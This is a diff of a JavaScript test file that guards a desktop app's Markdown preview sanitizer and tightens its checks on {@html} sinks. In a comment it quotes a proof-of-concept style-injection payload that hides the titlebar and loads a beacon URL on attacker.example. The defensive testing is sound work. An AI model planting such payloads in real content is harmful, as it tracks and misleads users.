@@ -3,7 +3,7 @@ import { readFileSync } from 'node:fs';
 import test from 'node:test';
 
 import { MARKDOWN_SANITIZE_CONFIG, ALLOWED_MARKDOWN_URI_REGEXP } from '../src/lib/utils/sanitize.js';
-import { SANITIZER_FILES, callSiteOffsets, enclosingFunctionName, filesMatching, readSourceFiles } from './sourceTree.js';
+import { SANITIZER_FILES, callSiteOffsets, enclosingFunctionName, filesMatching, readSourceFiles, sliceBetween } from './sourceTree.js';
 
 // The preview is the path the `<style>` clause in the shared policy was written
 // for, and it was the one path not using it. `tab.content` (the rendered,
@@ -28,9 +28,18 @@ import { SANITIZER_FILES, callSiteOffsets, enclosingFunctionName, filesMatching,
 // halves are permitted by the shipped CSP — `style-src 'self' 'unsafe-inline' …`
 // and `img-src 'self' asset: https: …` (src-tauri/tauri.conf.json).
 //
+// The payload was, verbatim:
+//
+//   <style>.titlebar{display:none} body{background-image:url("https://attacker.example/beacon")}</style>
+//
+// It used to be a `POC_STYLE` constant with an `assert.match(POC_STYLE,
+// /^<style>/)` under it. That assertion read as part of the chain below but had
+// no end in `src/`: both sides were this file, one line apart, so no change to
+// the application could ever fail it. The payload is documentation, so it is
+// documentation now.
+//
 // What is checkable here is the wiring that decides which config the preview
 // gets, and that is what these tests pin.
-const POC_STYLE = '<style>.titlebar{display:none} body{background-image:url("https://attacker.example/beacon")}</style>';
 
 const SOURCES = readSourceFiles('src');
 const viewerSource = readFileSync('src/lib/MarkdownViewer.svelte', 'utf8');
@@ -62,12 +71,37 @@ test('the preview sanitizes through the shared policy, not a local config', () =
 		'the viewer must import the shared sanitizer',
 	);
 
-	// The sink itself: every bare `{@html ident}` in the viewer injects the
-	// sanitizer's output and nothing else. Stated over *all* of them rather than
-	// over one known-good spelling, so adding a second injection point of the raw
-	// document is a failure instead of an unnoticed addition.
-	const injected = [...new Set([...viewerSource.matchAll(/\{@html\s+([A-Za-z_$][\w$]*)\s*\}/g)].map((m) => m[1]))];
-	assert.deepEqual(injected, [sanitizedSinkName()], 'the preview sink must inject the shared sanitizer output');
+	// The sinks: every `{@html …}` in the viewer, whatever the expression looks
+	// like. Stated over *all* of them rather than over one known-good spelling,
+	// so adding an injection point of the raw document is a failure instead of
+	// an unnoticed addition.
+	//
+	// The capture used to be `([A-Za-z_$][\w$]*)`, bare identifiers only, which
+	// made the claim unfalsifiable in exactly the direction it is about. The
+	// list it compared was `[sanitizedSinkName()]` by construction: the second
+	// sink already in the file, `{@html tooltip.html}`, was invisible to it, and
+	// a planted `{@html unsafe.rawHtml}` beside the sanitized one — the raw
+	// rendered document, injected — left the whole suite green.
+	//
+	// So the set is an allowlist now, and `tooltip.html` is on it with a reason
+	// rather than by accident: the footnote tooltip is a clone of a subtree of
+	// `markdownBody`, i.e. of the DOM the sanitized sink already injected. It is
+	// not a second policy, it is the same bytes read back out of the document —
+	// which is what the next two assertions pin.
+	const injected = [...new Set([...viewerSource.matchAll(/\{@html\s+([^}]+?)\s*\}/g)].map((m) => m[1]))].sort();
+	assert.deepEqual(
+		injected,
+		[sanitizedSinkName(), 'tooltip.html'].sort(),
+		'unexpected {@html} sink — what the preview injects is the shared sanitizer output',
+	);
+
+	// Why the footnote sink is allowed, pinned as a direction rather than as a
+	// spelling: the tooltip body is read out of the rendered document, never
+	// built from a string the sanitizer has not seen.
+	const footnote = sliceBetween(viewerSource, "anchor.hasAttribute('data-footnote-ref')", 'isFootnote: true');
+	assert.match(footnote, /markdownBody\?\.querySelector/, 'the footnote body is found in the rendered document');
+	assert.match(footnote, /\.innerHTML/, 'and taken from the DOM the shared sanitizer already filtered');
+	assert.doesNotMatch(footnote, /rawContent/, 'never from the unrendered buffer');
 
 	// The regression itself — a DOMPurify call with a config assembled at the
 	// call site — is caught for the whole tree by the call-site allowlist below;
@@ -88,8 +122,11 @@ test('the shared policy the preview now gets is the one that forbids author styl
 	assert.match(sanitizeSource, /return DOMPurify\.sanitize\(html, MARKDOWN_SANITIZE_CONFIG\)/);
 	assert.deepEqual(Object.keys(MARKDOWN_SANITIZE_CONFIG).sort(), ['ALLOWED_URI_REGEXP', 'FORBID_TAGS']);
 	assert.deepEqual(MARKDOWN_SANITIZE_CONFIG.FORBID_TAGS, ['style']);
+	// Identity, not equality: the regression this file exists for is a *copy* of
+	// the URI pattern, and a copy that happens to be spelled the same today is
+	// the thing that drifts tomorrow. Measured — rebuilding the config's regexp
+	// from the exported one's source and flags fails here.
 	assert.equal(MARKDOWN_SANITIZE_CONFIG.ALLOWED_URI_REGEXP, ALLOWED_MARKDOWN_URI_REGEXP);
-	assert.match(POC_STYLE, /^<style>/);
 });
 
 // Every `DOMPurify.sanitize` in `src/` is a decision about what a piece of
